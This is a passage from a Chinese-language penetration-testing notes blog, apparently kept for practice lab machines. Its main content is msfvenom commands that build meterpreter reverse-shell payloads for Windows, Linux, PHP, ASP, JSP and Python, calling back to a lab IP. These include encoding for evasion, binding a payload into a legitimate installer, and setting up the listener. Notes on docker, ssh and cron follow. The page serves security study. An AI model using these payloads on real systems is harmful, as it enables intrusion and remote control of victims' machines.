<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.88.10 LPORT=1234 -f exe -o backdoor.exe    //把x64去掉就是普通生成的shellcode</span><br><span class="line"></span><br><span class="line">msfvenom -platform windows -a x86 -p windows/meterpreter/reverse_tcp</span><br><span class="line">LHOST=192.168.88.10 LPORT=1234 -f exe -o /root/shell.exe</span><br></pre></td></tr></table></figure>

<p><strong>生成一个PHP反向Shell：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.88.10 LPORT=1234 -f raw -o shell.php</span><br></pre></td></tr></table></figure>

<p><strong>生成一个Linux ELF反向Shell：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.88.10 LPORT=1234 -f elf -o shell.elf   //x64可以换成x86</span><br></pre></td></tr></table></figure>

<p><strong>编码处理：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikita_ga_nai</span><br><span class="line">LHOST=192.168.88.10 LPORT=1234 -f exe -o /root/shell.exe</span><br></pre></td></tr></table></figure>

<p><strong>捆绑：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -p latform windows -a x64 -x</span><br><span class="line">/root/baidunetdisk.exe -k LHOST=192.168.88.10 LPORT=1234 -f exe -o /root/shell.exe</span><br></pre></td></tr></table></figure>

<p><strong>PHP</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.88.10 LPORT=1234 -f raw</span><br></pre></td></tr></table></figure>

<p><strong>ASP</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -P windows/meterpreter/reverse_tcp LHOST=192.168.88.10 LPORT=1234 -f asp</span><br></pre></td></tr></table></figure>

<p><strong>JSP</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shel1_reverse_tcp LHOST=192.168.88.10 LPORT=1234 -f raw</span><br></pre></td></tr></table></figure>

<p><strong>python</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.88.10 LPORT=1234 -f raw</span><br></pre></td></tr></table></figure>

<p><strong>msf进行监听</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter/reverse_tcp  //替换成跟生成的payload要一致</span><br><span class="line">set LHOST 192.168.88.10</span><br><span class="line">set LPORT 1234</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250914172952407.png" alt="image-20250914172952407" data-caption="image-20250914172952407" loading="lazy"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-f exe: 生成一个可执行文件。最简单直接，但也最容易被发现。</span><br><span class="line"></span><br><span class="line">-f ps1: 生成一个PowerShell脚本。无需文件落地，可直接在内存中执行，但依赖目标系统启用PowerShell且可能触发防护。</span><br><span class="line"></span><br><span class="line">-f asp / -f aspx: 生成ASP或ASPX脚本，用于Web攻击。</span><br><span class="line"></span><br><span class="line">-f raw: 生成原始的Shellcode。可以嵌入到自定义的漏洞利用代码（Exploit）中。</span><br><span class="line"></span><br><span class="line">选择.dll而不是.exe的主要目的是为了更高的隐蔽性和更强的持久化能力。 攻击者希望这个载荷看起来像一个正常的系统库文件，并通过各种技巧让它被系统或软件自动加载，从而避免直接创建可疑的新进程，更能绕过防御和用户的视线。</span><br></pre></td></tr></table></figure>



<h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者使用 phpinfo(); 通常是为了验证漏洞是否存在。如果页面返回了 phpinfo()` 的信息，证明攻击成功，该服务器存在远程代码执行（RCE）漏洞。</span><br></pre></td></tr></table></figure>

<h1 id="docker交互式shell-discuz全局变量防御绕过导致代码执行"><a href="#docker交互式shell-discuz全局变量防御绕过导致代码执行" class="headerlink" title="docker交互式shell(discuz全局变量防御绕过导致代码执行)"></a>docker交互式shell(discuz全局变量防御绕过导致代码执行)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose ps     //查看当前正在运行的容器列表，确认正确的容器ID或名称</span><br><span class="line">docker exec -it wooyun-2010-080723-discuz-1 /bin/sh   //进入容器ID为 &#x27;wooyun-2010-080723-discuz-1&#x27; 的容器内部，并打开一个交互式的 shell 终端</span><br></pre></td></tr></table></figure>

<h1 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">法一：</span><br><span class="line">ssh dlink@192.168.88.28</span><br><span class="line">法二：</span><br><span class="line">ssh -l dlink 192.168.88.28</span><br></pre></td></tr></table></figure>

<h1 id="定时-cron-任务"><a href="#定时-cron-任务" class="headerlink" title="定时(cron)任务"></a>定时(cron)任务</h1><p>在Linux系统中，你可以通过编辑一个叫 <code>crontab</code> 的文件来设置定时任务。其时间格式非常经典，由5个星号（或数字）组成：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*    *    *    *    *    &lt;要执行的命令&gt;</span><br><span class="line">│    │    │    │    │</span><br><span class="line">│    │    │    │    └─── 星期几 (0 - 6) (0代表星期日)</span><br><span class="line">│    │    │    └────── 月份 (1 - 12)</span><br><span class="line">│    │    └───────── 日期 (1 - 31)</span><br><span class="line">│    └──────────── 小时 (0 - 23)</span><br><span class="line">└─────────────── 分钟 (0 - 59)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">举例说明：</span><br><span class="line"></span><br><span class="line">0 2 * * * /home/backup.sh</span><br><span class="line">含义：每天凌晨2点整执行 /home/backup.sh 这个备份脚本。</span><br><span class="line"></span><br><span class="line">*/5 * * * * /home/check_status.py</span><br><span class="line">含义：每5分钟执行一次 /home/check_status.py 这个状态检查脚本。</span><br><span class="line"></span><br><span class="line">0 9 * * 1 /home/send_report.sh</span><br><span class="line">含义：每个星期一的上午9点执行发送周报的脚本。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="python虚拟环境安装包"><a href="#python虚拟环境安装包" class="headerlink" title="python虚拟环境安装包"></a>python虚拟环境安装包</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source myenv/bin/activate</span><br></pre></td></tr></table></figure>


    
  </article>

  
      

  
  
  <div class="nexmoe-post-meta nexmoe-rainbow">
   
    
</div>
  
  
    <script async src="/js/copy-codeblock.js?v=1761989925210"></script>
  

  
      <div class="nexmoe-post-footer">
          
      </div>
  
</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
        <div class="nexmoe-tool">

            

            
            
            <button class="mdui-fab catalog" style="overflow:unset;">
                <i class="nexmoefont icon-i-catalog"></i>
                <div class="nexmoe-toc">
                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.</span> <span class="toc-text">命令执行反弹shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#find%E6%89%BEsuid%E6%9D%83%E9%99%90%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">find找suid权限文件提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%BA%90%E7%A0%81"><span class="toc-number">3.</span> <span class="toc-text">查看源码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gobuster"><span class="toc-number">4.</span> <span class="toc-text">gobuster</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#suForce%E6%9C%AC%E5%9C%B0%E7%88%86%E7%A0%B4"><span class="toc-number">6.</span> <span class="toc-text">suForce本地爆破</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">7.</span> <span class="toc-text">注意事项</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python3%E5%BC%80%E5%90%AFhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">8.</span> <span class="toc-text">python3开启http服务</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ffuf"><span class="toc-number">9.</span> <span class="toc-text">ffuf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Argon2Cracker-py"><span class="toc-number">10.</span> <span class="toc-text">Argon2Cracker.py</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Drupwn-v1-0-4"><span class="toc-number">11.</span> <span class="toc-text">Drupwn v1.0.4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSH%E7%9A%84kali%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%8A%9F%E8%83%BD"><span class="toc-number">12.</span> <span class="toc-text">SSH的kali本地端口转发功能</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#echo%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="toc-number">13.</span> <span class="toc-text">echo写入文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E5%8F%8D%E5%90%91shell"><span class="toc-number">14.</span> <span class="toc-text">正向反向shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lsattr%E2%80%93%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%B1%9E%E6%80%A7-chat2"><span class="toc-number">15.</span> <span class="toc-text">lsattr–查看文件扩展属性(chat2)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6-bak-chat2"><span class="toc-number">16.</span> <span class="toc-text">备份文件.bak(chat2)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#msfvenom%E2%80%93%E7%94%9F%E6%88%90-payload%E5%8F%8D%E5%BC%B9shell-Cat"><span class="toc-number">17.</span> <span class="toc-text">msfvenom–生成 payload反弹shell(Cat)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#scp-%E2%80%93%E8%BF%9C%E7%A8%8B%E4%B8%BB%E6%9C%BA%E7%9B%B8%E4%BA%92%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6-Cat"><span class="toc-number">18.</span> <span class="toc-text">scp –远程主机相互传输文件(Cat)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#stegseek%E2%80%93%E9%9A%90%E5%86%99%E6%9C%AF%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7-Cat"><span class="toc-number">19.</span> <span class="toc-text">stegseek–隐写术分析工具(Cat)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E5%A4%8D%E5%88%B6a%E6%96%87%E4%BB%B6%E7%9A%84%E5%89%8D100%E8%A1%8C%E5%88%B0b%E6%96%87%E4%BB%B6"><span class="toc-number">20.</span> <span class="toc-text">Linux复制a文件的前100行到b文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nikto%E2%80%94%E8%87%AA%E5%8A%A8%E5%8C%96%E7%9A%84%E2%80%9C%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E5%91%98%E2%80%9D-Method"><span class="toc-number">21.</span> <span class="toc-text">nikto—自动化的“安全检查员”(Method)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#put%E6%96%B9%E6%B3%95-Method"><span class="toc-number">22.</span> <span class="toc-text">put方法(Method)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#msfvenom%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8%E5%8F%8D%E5%BC%B9shell-DC-3"><span class="toc-number">23.</span> <span class="toc-text">msfvenom生成后门反弹shell(DC-3)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">24.</span> <span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#docker%E4%BA%A4%E4%BA%92%E5%BC%8Fshell-discuz%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">25.</span> <span class="toc-text">docker交互式shell(discuz全局变量防御绕过导致代码执行)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssh%E8%BF%9E%E6%8E%A5"><span class="toc-number">26.</span> <span class="toc-text">ssh连接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6-cron-%E4%BB%BB%E5%8A%A1"><span class="toc-number">27.</span> <span class="toc-text">定时(cron)任务</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E5%8C%85"><span class="toc-number">28.</span> <span class="toc-text">python虚拟环境安装包</span></a></li></ol>
                </div>
            </button>
            

            

            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
        </div>
    </div>
</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
</div></body></html>